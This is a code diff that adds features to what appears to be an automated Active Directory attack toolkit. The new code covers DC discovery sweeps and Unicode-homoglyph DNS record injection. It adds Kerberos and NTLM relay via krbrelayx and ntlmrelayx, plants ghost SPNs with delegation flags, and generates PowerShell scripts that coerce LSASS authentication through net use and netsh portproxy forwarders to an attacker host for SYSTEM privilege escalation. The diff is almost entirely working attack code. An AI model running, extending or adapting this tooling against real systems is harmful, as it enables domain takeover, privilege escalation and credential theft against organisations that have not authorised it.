@@ -25,6 +25,11 @@
 ║  17. GPO abuse (pyGPOAbuse scheduled task as SYSTEM)            ║
 ║  18. WSUS injection + AppLocker bypass (LOLBins/signed updates) ║
 ║  19. DCSync + DPAPI backup key extraction                        ║
+║  20. BloodHound -c All collection + auto high-value analysis    ║
+║  21. Auth-reflection bypass (Synacktiv 2026):                    ║
+║      - Unicode-SPN Kerberos reflection (CVE-2025-58726 ghost SPN)║
+║      - CVE-2026-24294 LPE (SMB-on-arbitrary-tcpport)             ║
+║      - CVE-2026-26128 LPE (Kerberos loopback via Unicode SPN)    ║
 ╚══════════════════════════════════════════════════════════════════╝
 """
 
@@ -43,6 +48,7 @@ import sys
 import textwrap
 import threading
 import time
+import zipfile
 from dataclasses import dataclass, field
 from datetime import datetime
 from pathlib import Path
@@ -52,11 +58,37 @@ from typing import Optional
 # Configuration
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-VERSION = "4.7.4"
+VERSION = "4.9.0"
 TOOLS_DIR = Path("/opt/tools")
 CVE_DIR = TOOLS_DIR / "CVE-2025-33073"
+KRBRELAYX_DIR = TOOLS_DIR / "krbrelayx"
 
 COERCION_METHODS = ["DFSCoerce", "PetitPotam", "PrinterBug", "ShadowCoerce", "MSEven"]
+
+# Unicode homoglyphs for SPN-collision attacks (Synacktiv 2026 Kerberos
+# reflection technique, CVE-2025-58726). LCMapStringEx with linguistic
+# normalization collapses these to ASCII during AD/Kerberos canonicalization,
+# while DnsCache's CompareStringW comparison preserves them — so the DNS
+# record points to attacker, but the issued TGS/AP-REQ is for the real host.
+# `R` -> circled-R and `.` -> one-dot-leader are the pair shown in the blog.
+UNICODE_HOMOGLYPHS = {
+    "R": "Ⓡ", ".": "․",
+    "A": "А", "B": "В", "C": "С", "E": "Е", "H": "Н", "I": "І",
+    "K": "К", "M": "М", "O": "О", "P": "Р", "T": "Т", "X": "Х",
+    "a": "а", "c": "с", "e": "е", "i": "і", "o": "о", "p": "р",
+    "x": "х", "y": "у",
+}
+
+# Loopback-signing enforcement (March 2026 patch for CVE-2026-26128) is
+# present on Server 2025 / Win11 24H2 builds. Hosts at or below these
+# build numbers may still be vulnerable to the reflection LPE phases.
+# Build floors are conservative — operator confirms via target patch level.
+LOOPBACK_VULNERABLE_OS_HINTS = (
+    "Windows Server 2025",
+    "Windows 11",       # 24H2 = build 26100.x (pre-patch)
+    "Build 26100",
+    "Build 26200",
+)
 
 # LOLBins that bypass AppLocker default rules (Microsoft-signed, in trusted paths)
 LOLBINS = {
@@ -156,15 +188,31 @@ class Config:
     no_rbcd: bool = False
     machine_account: str = ""
     machine_password: str = ""
+    alt_spn: str = ""              # KCD protocol-transition bypass (tgssub-style)
+    in_ccache: str = ""            # input ccache for --phase tgs-rewrite
 
     # DPAPI options
     no_dpapi: bool = False
+
+    # BloodHound options (v4.9.0 — post-auth graph collection + analysis)
+    no_bloodhound: bool = False
+    no_bh_auto_action: bool = False  # disable opportunistic chains from BH actionable edges
+
+    # Loot options (v4.9.0 — cmdline + KeePass harvest on compromised hosts)
+    no_loot: bool = False
 
     # Credential discovery options (v4.7.0 — pre-cut zero-auth foothold)
     no_discover: bool = False
     users_file: str = ""           # path to user list; auto-falls back to SecLists
     spray_password: str = ""       # single password to spray; empty = skip spray
     discovered_users: list = field(default_factory=list, repr=False)
+
+    # Authentication-reflection bypass options (v4.8.0 — Synacktiv 2026 chain)
+    unicode_spn: bool = False      # Kerberos AP-REQ reflection via Unicode SPN collision
+    no_ghost_spn: bool = False     # skip CVE-2025-58726 ghost-SPN upgrade after LDAP relay
+    no_loopback_check: bool = False  # skip loopback-signing fingerprint during enum
+    reflect_host: str = ""         # foothold host for reflect-tcpport/reflect-loopback (cosmetic — script is generic)
+    reflect_port: int = 12345      # arbitrary high port for SMB-on-tcpport (CVE-2026-24294)
 
     # Runtime
     phase: str = "full"
@@ -457,6 +505,9 @@ class AutoDiscovery:
     def __init__(self, cfg: Config):
         self.cfg = cfg
         self.detected = 0
+        # Track attrs set by this discovery run so _skip() doesn't relabel
+        # them as "user-specified" when re-checked by a later detect step
+        self._auto_set: set[str] = set()
 
     def run_all(self):
         phase_header("AUTO-DISCOVERY")
@@ -465,6 +516,11 @@ class AutoDiscovery:
         self._detect_gateway()
         self._detect_subnet()
         if self.cfg.has_creds or self.cfg.phase != "arp":
+            # Subnet sweep first when domain+dc_ip both unknown — breaks the
+            # chicken-and-egg where _detect_domain needs dc_ip and
+            # _detect_dc_ip needs domain. Common on AWS / VPC labs where
+            # resolv.conf doesn't point at AD DNS.
+            self._detect_dc_via_scan()
             self._detect_domain()
             self._detect_dc_ip()
             self._detect_dc_fqdn()
@@ -474,13 +530,17 @@ class AutoDiscovery:
         """Set config attribute and log it."""
         if value:
             setattr(self.cfg, attr, value)
+            self._auto_set.add(attr)
             ok(f"{attr.replace('_', ' ').title()}: {value} (auto: {method})")
             self.detected += 1
 
     def _skip(self, attr: str):
         val = getattr(self.cfg, attr)
         if val:
-            detail(f"{attr.replace('_', ' ').title()}: {val} (user-specified)")
+            # If we set this in an earlier discovery step, don't re-log
+            # (would mislabel as "user-specified")
+            if attr not in self._auto_set:
+                detail(f"{attr.replace('_', ' ').title()}: {val} (user-specified)")
             return True
         return False
 
@@ -575,6 +635,95 @@ class AutoDiscovery:
                 pass
         log.error("Could not detect target subnet — specify with -t")
 
+    def _detect_dc_via_scan(self):
+        """Sweep nearby subnets with `nxc smb` to find any domain-joined host.
+        Most common (domain:DOM) advertised in the SMB banners wins; the
+        first host in that domain that also has SMB signing on becomes the
+        dc_ip candidate (DCs require signing by default).
+
+        Tries multiple candidate ranges in order: target_net (interface
+        subnet, often /26 on AWS), then the /24 derived from attacker_ip
+        (covers separate AD subnet on the same VPC). Sets cfg.domain
+        + cfg.dc_ip + cfg.dc_fqdn in one shot, breaking the chicken-
+        and-egg dependency between _detect_domain and _detect_dc_ip."""
+        if self.cfg.dc_ip and self.cfg.domain:
+            return
+        if not tool_exists("nxc"):
+            return
+
+        ranges: list[str] = []
+        if self.cfg.target_net:
+            ranges.append(self.cfg.target_net)
+        # Widen to /24 around attacker_ip if not already covered (AWS labs
+        # often put jumpbox and AD hosts on different subnets within a /24)
+        if self.cfg.attacker_ip:
+            try:
+                wider = str(ipaddress.ip_network(
+                    f"{self.cfg.attacker_ip}/24", strict=False))
+                if wider not in ranges:
+                    ranges.append(wider)
+            except Exception:
+                pass
+
+        for net_str in ranges:
+            try:
+                net = ipaddress.ip_network(net_str, strict=False)
+                if net.num_addresses > 1024:
+                    detail(f"Skipping {net_str} (too large: {net.num_addresses} hosts)")
+                    continue
+            except Exception:
+                continue
+
+            log.info(f"🔍 nxc smb sweep on {net_str} for domain-joined hosts...")
+            try:
+                out = subprocess.check_output(
+                    ["nxc", "smb", net_str],
+                    text=True, timeout=180, stderr=subprocess.DEVNULL
+                )
+            except Exception as e:
+                log.debug(f"nxc sweep on {net_str} failed: {e}")
+                continue
+
+            domain_counts: dict[str, int] = {}
+            candidates: list[tuple[str, str, bool, str]] = []
+            for line in out.splitlines():
+                m = re.search(
+                    r"SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+(\S+)\s+\[\*\].*?domain:([^\s)]+).*?signing:(\w+)",
+                    line,
+                )
+                if not m:
+                    continue
+                ip, name, dom, signing = m.group(1), m.group(2), m.group(3), m.group(4) == "True"
+                if dom and "." in dom:
+                    domain_counts[dom] = domain_counts.get(dom, 0) + 1
+                    candidates.append((ip, name, signing, dom))
+
+            if not domain_counts:
+                detail(f"No domain-joined hosts on {net_str}")
+                continue
+
+            best_dom = max(domain_counts.items(), key=lambda kv: kv[1])[0]
+            if not self.cfg.domain:
+                self._set("domain", best_dom, f"nxc sweep {net_str}")
+            if not self.cfg.dc_ip:
+                # Prefer hosts with signing=True (DCs require signing by default)
+                for ip, name, signing, dom in candidates:
+                    if dom == best_dom and signing:
+                        self._set("dc_ip", ip, f"nxc sweep {net_str} (signing=True)")
+                        if not self.cfg.dc_fqdn:
+                            self._set("dc_fqdn", f"{name.lower()}.{best_dom}",
+                                      f"nxc sweep {net_str}")
+                        return
+                # Fallback: first host in domain (member server)
+                for ip, name, signing, dom in candidates:
+                    if dom == best_dom:
+                        self._set("dc_ip", ip, f"nxc sweep {net_str}")
+                        if not self.cfg.dc_fqdn:
+                            self._set("dc_fqdn", f"{name.lower()}.{best_dom}",
+                                      f"nxc sweep {net_str}")
+                        return
+            return  # found domain — don't widen further
+
     def _detect_domain(self):
         if self._skip("domain"):
             return
@@ -663,39 +812,58 @@ class AutoDiscovery:
         domain = self.cfg.domain
         if not domain:
             return
-        # SRV lookup
+
+        # Build a list of dig invocations to try, in order. When
+        # cfg.gateway is on the same subnet as a likely DC, also probe
+        # there in case the DC was discovered in some other way.
+        dig_targets: list[list[str]] = [[]]  # [] = system resolver
+        # If the user specified a DC IP somewhere upstream, prefer it
+        # explicitly — works around AWS / VPC labs where resolv.conf
+        # doesn't point at the AD DNS server.
+        if self.cfg.dc_ip:
+            dig_targets.insert(0, [f"@{self.cfg.dc_ip}"])
+
+        # SRV lookup with each candidate resolver
         if tool_exists("dig"):
-            try:
-                out = subprocess.check_output(
-                    ["dig", "+short", "SRV", f"_ldap._tcp.dc._msdcs.{domain}"],
-                    text=True, timeout=10, stderr=subprocess.DEVNULL
-                )
-                lines = sorted(out.strip().splitlines())
-                if lines:
+            for at in dig_targets:
+                try:
+                    out = subprocess.check_output(
+                        ["dig", "+short", "+timeout=3"] + at +
+                        ["SRV", f"_ldap._tcp.dc._msdcs.{domain}"],
+                        text=True, timeout=10, stderr=subprocess.DEVNULL
+                    )
+                    lines = sorted(out.strip().splitlines())
+                    if not lines:
+                        continue
                     host = lines[0].split()[-1].rstrip(".")
                     out2 = subprocess.check_output(
-                        ["dig", "+short", "A", host], text=True, timeout=5,
-                        stderr=subprocess.DEVNULL
+                        ["dig", "+short", "+timeout=3"] + at + ["A", host],
+                        text=True, timeout=5, stderr=subprocess.DEVNULL
                     )
                     ip = out2.strip().splitlines()[0] if out2.strip() else ""
                     if ip:
-                        self._set("dc_ip", ip, "DNS SRV _ldap._tcp")
+                        method = "DNS SRV _ldap._tcp"
+                        if at:
+                            method += f" {at[0]}"
+                        self._set("dc_ip", ip, method)
                         return
-            except Exception:
-                pass
+                except Exception:
+                    continue
+
         # Fallback: resolve domain directly
         if tool_exists("dig"):
-            try:
-                out = subprocess.check_output(
-                    ["dig", "+short", "A", domain], text=True, timeout=5,
-                    stderr=subprocess.DEVNULL
-                )
-                ip = out.strip().splitlines()[0] if out.strip() else ""
-                if ip:
-                    self._set("dc_ip", ip, f"DNS A {domain}")
-                    return
-            except Exception:
-                pass
+            for at in dig_targets:
+                try:
+                    out = subprocess.check_output(
+                        ["dig", "+short", "+timeout=3"] + at + ["A", domain],
+                        text=True, timeout=5, stderr=subprocess.DEVNULL
+                    )
+                    ip = out.strip().splitlines()[0] if out.strip() else ""
+                    if ip:
+                        self._set("dc_ip", ip, f"DNS A {domain}")
+                        return
+                except Exception:
+                    continue
         log.error("Could not detect DC IP — specify with --dc-ip")
 
     def _detect_dc_fqdn(self):
@@ -864,8 +1032,69 @@ def check_prerequisites(cfg: Config) -> bool:
     if tool_exists("impacket-dpapi"):
         ok("impacket-dpapi available (DPAPI backup key extraction)")
 
+    # ── v4.9.0 additions ────────────────────────────────────────────────
+    # Discover phase
+    if tool_exists("kerbrute"):
+        ok("kerbrute available (KRB-AS-REQ user enumeration)")
+    else:
+        log.warning("kerbrute not found (--phase discover degraded — only CLDAP enum)")
+
+    if tool_exists("userenum-cldap") or (TOOLS_DIR / "userenum-cldap.py").exists():
+        ok("userenum-cldap available (CLDAP NetLogon ping enumeration)")
+    else:
+        log.warning("userenum-cldap not found (--phase discover degraded — only kerbrute enum)")
+
+    try:
+        import asn1tools  # noqa: F401
+        ok("asn1tools available (CLDAP userenum runtime)")
+    except ImportError:
+        log.warning("asn1tools missing (CLDAP userenum will silently no-op — pip install asn1tools)")
+
+    # SecLists presence — major impact on discover candidate breadth
+    if any(Path(p).is_file() for p in _SECLISTS_USER_PATHS):
+        ok("SecLists found (rich --phase discover candidates)")
+    else:
+        log.warning("SecLists not installed (--phase discover degraded to 24-name shortlist) — apt install seclists OR git clone https://github.com/danielmiessler/SecLists /usr/share/seclists")
+
+    # bloodyAD (used by ghost-SPN, RBCD, shadow creds, GPO abuse)
+    if tool_exists("bloodyAD") or tool_exists("bloodyad"):
+        ok("bloodyAD available (LDAP write helper)")
+    else:
+        log.warning("bloodyAD not found (--phase exploit / shadow / RBCD / GPO degraded — pipx install bloodyAD)")
+
+    # BloodHound collection + auto-action
+    if tool_exists("bloodhound-python"):
+        ok("bloodhound-python available (--phase bloodhound + auto-action)")
+    else:
+        log.warning("bloodhound-python not found (--phase bloodhound disabled — apt install bloodhound.py OR pipx install bloodhound)")
+
+    # Loot phase
+    if tool_exists("smbclient"):
+        ok("smbclient available (--phase loot file pulls)")
+    else:
+        log.warning("smbclient not found (--phase loot KeePass download disabled — apt install smbclient)")
+
+    if tool_exists("keepass2john"):
+        ok("keepass2john available (--phase loot KeePass cracking)")
+    else:
+        log.warning("keepass2john not found (--phase loot KeePass crack disabled — apt install john)")
+
+    # TGS rewrite (optional — has impacket fallback)
+    tgssub_path = find_tool("tgssub.py", paths=[TOOLS_DIR / "tgssub" / "tgssub.py"])
+    if tgssub_path:
+        ok("tgssub.py available (KCD bypass primitive)")
+    else:
+        detail("tgssub.py not found (--phase tgs-rewrite uses impacket fallback)")
+
+    # Coercion helpers
+    if tool_exists("coercer"):
+        ok("coercer available (DHCP/PetitPotam multi-method coercion)")
+    else:
+        log.warning("coercer not found (DHCP coercion phase disabled — pipx install coercer)")
+
     if missing:
-        log.error("Missing prerequisites. Install with: sudo ./kali-install.sh")
+        log.error("Missing required prerequisites — see warnings above for "
+                  "install hints (apt / pipx / pip).")
         return False
     ok("All prerequisites satisfied")
     return True
@@ -1255,6 +1484,9 @@ def enumerate_targets(cfg: Config) -> tuple[list[str], list[str]]:
         log.warning("No relay targets found (all hosts have SMB signing)")
         log.warning("Try --smb-signing to relay via LDAPS instead")
 
+    # CVE-2026-24294 / 26128 LPE candidates (Synacktiv 2026)
+    detect_loopback_candidates(cfg, smb_output)
+
     # --- Delegation scan ---
     separator()
     log.info("🔍 Looking for unconstrained delegation hosts...")
@@ -1386,6 +1618,24 @@ def exploit_target(target: str, cfg: Config) -> bool:
                 cfg.smb_signing = False
                 return True
         cfg.smb_signing = False
+
+    # Unicode-SPN Kerberos reflection (Synacktiv 2026 — bypasses CVE-2025-33073 patch)
+    if cfg.unicode_spn and cfg.has_creds:
+        log.warning("NTLM reflection methods failed — trying Kerberos Unicode-SPN reflection...")
+        target_fqdn = target
+        if "." not in target and "." in cfg.dc_fqdn and tool_exists("dig"):
+            try:
+                rev = subprocess.check_output(
+                    ["dig", "+short", "-x", target], text=True, timeout=5,
+                    stderr=subprocess.DEVNULL,
+                ).strip().rstrip(".")
+                if rev:
+                    target_fqdn = rev.splitlines()[0]
+            except Exception:
+                pass
+        if run_kerberos_reflection(target_fqdn, cfg):
+            (cfg.work_dir / f"working-method-{target}.txt").write_text("unicode-spn")
+            return True
 
     # Last resort: ARP spoof
     if not cfg.no_arp:
@@ -1694,6 +1944,315 @@ def cleanup_dns_records(cfg: Config):
         run(parts, cfg, timeout=30)
 
     ok("DNS cleanup complete")
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Authentication Reflection Bypass (Synacktiv 2026 — CVE-2026-24294 / 26128,
+# CVE-2025-58726 ghost-SPN, Unicode-SPN Kerberos reflection)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def _make_unicode_homoglyph(name: str) -> str:
+    """Substitute ASCII chars with Unicode homoglyphs that LCMapStringEx
+    normalizes back to ASCII (so Kerberos issues a TGS for the real host)
+    but DnsCache CompareStringW treats as distinct (so DNS resolves the
+    homoglyph record to attacker). Only the FIRST occurrence of each char
+    is substituted — keeping the diff minimal makes the collision more
+    likely to survive case folding / locale variation across patch levels."""
+    out = []
+    used = set()
+    for ch in name:
+        if ch in UNICODE_HOMOGLYPHS and ch not in used:
+            out.append(UNICODE_HOMOGLYPHS[ch])
+            used.add(ch)
+        else:
+            out.append(ch)
+    return "".join(out)
+
+
+def register_unicode_dns_record(spn_target: str, cfg: Config) -> Optional[str]:
+    """Register an ADIDNS record for a Unicode-homoglyph variant of the
+    target hostname pointing to the attacker. Returns the homoglyph FQDN
+    or None on failure. dnstool.py from krbrelayx is reused; the chain's
+    standard cleanup_dns_records() picks up the record on exit."""
+    dnstool = find_tool(
+        "dnstool.py",
+        paths=[KRBRELAYX_DIR / "dnstool.py", CVE_DIR / "dnstool.py"]
+    )
+    if not dnstool:
+        log.error("dnstool.py not found — cannot register Unicode DNS record")
+        log.error("Install krbrelayx: git clone https://github.com/dirkjanm/krbrelayx /opt/tools/krbrelayx")
+        return None
+
+    if not cfg.has_creds:
+        log.error("Unicode-SPN reflection requires credentials (need DC LDAP write to inject A record)")
+        return None
+
+    homoglyph = _make_unicode_homoglyph(spn_target)
+    if homoglyph == spn_target:
+        log.warning(f"No homoglyph substitutions applied to {spn_target} — chars not in table")
+        return None
+
+    log.info(f"📝 Registering Unicode A-record: {homoglyph} -> {cfg.attacker_ip}")
+    cmd = dnstool.split() + [
+        "-u", cfg.auth_string, "-dc-ip", cfg.dc_ip,
+        "-a", "add", "-r", homoglyph, "-d", cfg.attacker_ip, "-t", "A",
+    ]
+    out_file = cfg.work_dir / f"unicode-dns-{datetime.now():%H%M%S}.txt"
+    result = run(cmd, cfg, timeout=30, outfile=out_file)
+    if result.returncode != 0:
+        log.warning(f"dnstool add failed: {_first_line(result.stderr or '')}")
+        return None
+    ok(f"Unicode DNS record registered: {homoglyph}")
+    return homoglyph
+
+
+def run_kerberos_reflection(target_fqdn: str, cfg: Config) -> bool:
+    """Kerberos AP-REQ reflection via Unicode-SPN collision (Synacktiv blog
+    Part 2). Coerces target → krbrelayx receives AP-REQ for the homoglyph
+    SPN → relays to the real target's SMB. Requires a krbrelayx fork that
+    accepts Unicode `sname` matching (operator must apply the LCMapStringEx
+    normalization patch — public PoC not yet released)."""
+    phase_header(f"KERBEROS REFLECTION via Unicode SPN ({target_fqdn})")
+
+    if not (KRBRELAYX_DIR / "krbrelayx.py").exists():
+        log.error(f"krbrelayx not found at {KRBRELAYX_DIR}")
+        return False
+
+    homoglyph = register_unicode_dns_record(target_fqdn, cfg)
+    if not homoglyph:
+        return False
+
+    log.warning("⚠️  Standard krbrelayx does NOT match Unicode SPNs — apply the")
+    log.warning("    LCMapStringEx normalization patch to krbrelayx.py first.")
+    log.warning("    Synacktiv's blog (May 2026, Part 2) describes the patch;")
+    log.warning("    no public fork at time of writing.")
+
+    # Start patched krbrelayx listening for AP-REQ; relay to real target SMB.
+    out_file = cfg.work_dir / f"kerb-reflect-{target_fqdn}.txt"
+    relay_cmd = [
+        "python3", str(KRBRELAYX_DIR / "krbrelayx.py"),
+        "-t", f"smb://{target_fqdn}",
+        "--smb2support",
+    ]
+    if cfg.nthash:
+        relay_cmd += ["--hashes", f":{cfg.nthash}", "-u", cfg.username]
+    elif cfg.password:
+        relay_cmd += ["--krbpass", f"{cfg.username}:{cfg.password}"]
+    relay_proc = run(relay_cmd, cfg, bg=True, outfile=out_file)
+    if not relay_proc or (hasattr(relay_proc, "returncode") and relay_proc.returncode != 0):
+        log.error("krbrelayx failed to start")
+        return False
+    ok(f"krbrelayx listener up (PID: {getattr(relay_proc, 'pid', '?')})")
+
+    # Coerce the *target host* (not the DC) — the AP-REQ listens for the
+    # homoglyph SPN. PetitPotam.py: <listener> <target>.
+    log.info(f"🔨 Coercing {target_fqdn} → \\\\{homoglyph}\\share\\foo")
+    coerce_outfile = cfg.work_dir / f"kerb-reflect-coerce-{target_fqdn}.txt"
+    petitpotam = find_tool(
+        "impacket-PetitPotam", "PetitPotam.py",
+        paths=[Path("/usr/share/doc/python3-impacket/examples/PetitPotam.py"),
+               TOOLS_DIR / "PetitPotam" / "PetitPotam.py"],
+    )
+    if petitpotam:
+        coerce_cmd = petitpotam.split() + _build_coerce_auth(cfg) + [homoglyph, target_fqdn]
+        run(coerce_cmd, cfg, timeout=60, outfile=coerce_outfile)
+
+    time.sleep(15)
+    relay_output = out_file.read_text() if out_file.exists() else ""
+    if "Authenticating against" in relay_output or "Target system" in relay_output:
+        ok(f"Kerberos reflection succeeded against {target_fqdn}")
+        return True
+    log.warning("No relay activity — check krbrelayx output for Unicode-SPN match failures")
+    return False
+
+
+def detect_loopback_candidates(cfg: Config, smb_enum_path: Path) -> list[str]:
+    """Parse nxc SMB enumeration output for OS strings that indicate
+    potential CVE-2026-24294 / 26128 LPE candidates (Server 2025, Win11
+    24H2, pre-March-2026 build). Saves matches to loopback-candidates.txt
+    so the operator can target reflect-tcpport / reflect-loopback there."""
+    if cfg.no_loopback_check or not smb_enum_path.exists():
+        return []
+
+    candidates = []
+    for line in smb_enum_path.read_text().splitlines():
+        if any(hint in line for hint in LOOPBACK_VULNERABLE_OS_HINTS):
+            m = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
+            if m and m.group(1) not in candidates:
+                candidates.append(m.group(1))
+
+    if candidates:
+        out = cfg.work_dir / "loopback-candidates.txt"
+        out.write_text("\n".join(candidates) + "\n")
+        ok(f"📋 {len(candidates)} loopback-LPE candidate(s) (CVE-2026-24294/26128)")
+        for c in candidates:
+            detail(f"{c} — try --phase reflect-tcpport or reflect-loopback")
+    return candidates
+
+
+def try_ghost_spn_upgrade(target_machine: str, cfg: Config) -> bool:
+    """CVE-2025-58726: after relaying to LDAP and obtaining SPN-write rights
+    on a target machine account, plant a ghost SPN, then trigger a Kerberos
+    coercion to that SPN — DC issues TGS the attacker can decrypt + relay.
+    Opportunistic: only fires when bloodyAD reports SPN-write success."""
+    if cfg.no_ghost_spn or not cfg.has_creds:
+        return False
+
+    if not tool_exists("bloodyAD"):
+        log.warning("bloodyAD not found — skipping ghost-SPN upgrade")
+        return False
+
+    log.info(f"👻 Attempting CVE-2025-58726 ghost-SPN on {target_machine}")
+    ghost_spn = f"HOST/ghost-{int(time.time())}.{cfg.domain}"
+
+    out_file = cfg.work_dir / f"ghost-spn-{target_machine}.txt"
+    cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + [
+        "add", "uac", target_machine, "-f", "TRUSTED_FOR_DELEGATION",
+    ]
+    run(cmd, cfg, timeout=30, outfile=out_file)
+
+    cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + [
+        "set", "object", target_machine, "servicePrincipalName", "-v", ghost_spn,
+    ]
+    result = run(cmd, cfg, timeout=30, outfile=out_file)
+    if result.returncode != 0:
+        log.warning(f"Ghost-SPN write failed (need SPN-write rights on {target_machine})")
+        return False
+
+    ok(f"Ghost SPN planted: {ghost_spn}")
+    detail(f"Trigger Kerberos coercion to {ghost_spn} → krbtgt-encrypted TGS issued")
+    detail(f"Decrypt with {target_machine}$ key and relay (krbrelayx --aesKey)")
+    return True
+
+
+def run_reflect_tcpport(cfg: Config) -> bool:
+    """CVE-2026-24294 LPE — generates the operator script for the foothold
+    (Win11 24H2 / Server 2025 pre-March-2026). The Kali side hosts a relay
+    listener; the operator runs the generated PowerShell on the foothold to
+    spawn a local SMB server on a high port, mount it via `net use`, then
+    coerce LSASS — TCP reuse forwards the privileged auth to the attacker
+    listener which relays it back to the real SMB → SYSTEM."""
+    phase_header(f"CVE-2026-24294 LPE — SMB-on-tcpport reflection (port {cfg.reflect_port})")
+
+    target_label = cfg.reflect_host or "<foothold>"
+    script_path = cfg.work_dir / "reflect-tcpport-trigger.ps1"
+    script_path.write_text(f"""# CVE-2026-24294 trigger — run on the {target_label} foothold (admin shell NOT required)
+# Prereq: Win11 24H2 or Server 2025, pre-March-2026 patch (no loopback-signing enforcement)
+# Usage:  powershell -ExecutionPolicy Bypass -File reflect-tcpport-trigger.ps1
+
+$attacker = '{cfg.attacker_ip}'
+$port     = {cfg.reflect_port}
+
+# 1. Mount attacker SMB on arbitrary TCP port (WNetAddConnection4W /tcpport flag)
+Write-Host "[*] Mounting \\\\$attacker\\share on TCP $port"
+& net use "\\\\$attacker\\share" "/tcpport:$port" /persistent:no
+
+# 2. Coerce LSASS to authenticate to the same UNC (TCP connection reuse)
+#    PetitPotam-style local trigger; modify if your Windows build needs a different RPC.
+Write-Host "[*] Triggering local privileged auth (LSASS → SMB on port $port)"
+$petit = "$env:TEMP\\petit_local.exe"
+if (-not (Test-Path $petit)) {{
+    Write-Host "[!] Drop a local PetitPotam binary at $petit (e.g., topotam/PetitPotam Release.exe)"
+    exit 1
+}}
+& $petit $env:COMPUTERNAME "\\\\$attacker\\share\\foo"
+
+Write-Host "[+] Done — check attacker-side ntlmrelayx for SYSTEM session on local SMB"
+""")
+    ok(f"Operator trigger script: {script_path}")
+
+    smb_relay_target = f"{cfg.reflect_host or 'localhost'}:445"
+    log.info(f"🎣 Starting ntlmrelayx (port {cfg.reflect_port}) → relay to {smb_relay_target}")
+    relay_out = cfg.work_dir / "reflect-tcpport-relay.txt"
+    relay_proc = run(
+        ["impacket-ntlmrelayx", "-t", f"smb://{smb_relay_target}",
+         "-smb2support", "--no-http-server", "--no-wcf-server",
+         "--smb-port", str(cfg.reflect_port)],
+        cfg, bg=True, outfile=relay_out,
+    )
+    if not relay_proc:
+        return False
+
+    log.warning("⚠️  Stock impacket-smbserver may not parse privileged blobs on")
+    log.warning("    a shared TCP connection — Synacktiv blog Part 1 describes the")
+    log.warning("    smbserver patch needed. No public PoC at time of writing.")
+    detail(f"Drop {script_path.name} on the foothold and execute it")
+    detail(f"Watch {relay_out} for SYSTEM session")
+    detail("Listener stays up until --poison-duration (default 120s) or Ctrl+C")
+    time.sleep(min(cfg.poison_duration, 600))
+    return True
+
+
+def run_reflect_loopback(cfg: Config) -> bool:
+    """CVE-2026-26128 LPE — Kerberos loopback variant. Generates an operator
+    script that registers the Unicode-SPN DNS record, deploys a local TCP
+    forwarder on the foothold, and triggers coercion. The AP-REQ travels
+    through the loopback forwarder; loopback-signing-enforcement off ⇒
+    privileged SMB session opens locally."""
+    phase_header(f"CVE-2026-26128 LPE — Kerberos loopback reflection")
+
+    target_fqdn = cfg.dc_fqdn if cfg.reflect_host == cfg.dc_ip else (cfg.reflect_host or cfg.dc_fqdn)
+    if not target_fqdn:
+        log.error("--phase reflect-loopback needs --target/-T (foothold FQDN) or --dc-fqdn")
+        return False
+
+    homoglyph = register_unicode_dns_record(target_fqdn, cfg)
+    if not homoglyph:
+        log.warning("Could not register Unicode DNS — operator must inject manually")
+        homoglyph = _make_unicode_homoglyph(target_fqdn)
+
+    script_path = cfg.work_dir / "reflect-loopback-trigger.ps1"
+    script_path.write_text(f"""# CVE-2026-26128 trigger — run on the {target_fqdn} foothold (admin shell NOT required)
+# Prereq: Win11 24H2 or Server 2025, pre-March-2026 patch
+# Pair with: krbrelayx (Unicode-SPN patch) on attacker {cfg.attacker_ip}
+
+$homoglyph = '{homoglyph}'
+$attacker  = '{cfg.attacker_ip}'
+
+# 1. Local TCP forwarder: 127.0.0.2:88 -> attacker:88 (krbrelayx)
+#    netsh portproxy keeps loopback-source IP, satisfying old IP-based checks.
+Write-Host "[*] Setting up loopback forwarder 127.0.0.2:88 -> $attacker:88"
+& netsh interface portproxy add v4tov4 listenaddress=127.0.0.2 listenport=88 `
+    connectaddress=$attacker connectport=88
+
+# 2. Trigger coercion to the homoglyph SPN — DC issues TGS for the real host;
+#    AP-REQ goes via loopback → krbrelayx → real SMB.
+Write-Host "[*] Coercing local auth to $homoglyph"
+$petit = "$env:TEMP\\petit_local.exe"
+if (-not (Test-Path $petit)) {{
+    Write-Host "[!] Drop a local PetitPotam binary at $petit"
+    exit 1
+}}
+& $petit -pipe efsr $env:COMPUTERNAME "\\\\$homoglyph\\share\\foo"
+
+Write-Host "[+] Done — check attacker-side krbrelayx for SYSTEM session"
+Write-Host "[*] Cleanup: netsh interface portproxy delete v4tov4 listenaddress=127.0.0.2 listenport=88"
+""")
+    ok(f"Operator trigger script: {script_path}")
+
+    if not (KRBRELAYX_DIR / "krbrelayx.py").exists():
+        log.error(f"krbrelayx not found at {KRBRELAYX_DIR}")
+        return False
+
+    relay_out = cfg.work_dir / "reflect-loopback-relay.txt"
+    log.info(f"🎣 Starting krbrelayx (Kerberos AP-REQ on :88) → relay to {target_fqdn}")
+    relay_cmd = [
+        "python3", str(KRBRELAYX_DIR / "krbrelayx.py"),
+        "-t", f"smb://{target_fqdn}",
+        "--smb2support",
+    ]
+    if cfg.has_creds:
+        relay_cmd += ["--krbpass", f"{cfg.username}:{cfg.password or ''}"]
+    relay_proc = run(relay_cmd, cfg, bg=True, outfile=relay_out)
+    if not relay_proc:
+        return False
+
+    log.warning("⚠️  krbrelayx needs the Unicode-SPN matching patch (LCMapStringEx")
+    log.warning("    normalization). No public fork at time of writing — apply manually.")
+    detail(f"Drop {script_path.name} on the foothold and execute it")
+    detail(f"Watch {relay_out} for SYSTEM session on {target_fqdn}")
+    time.sleep(min(cfg.poison_duration, 600))
+    return True
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -5176,6 +5735,98 @@ def run_shadow_credentials(target: str, cfg: Config) -> bool:
 
 
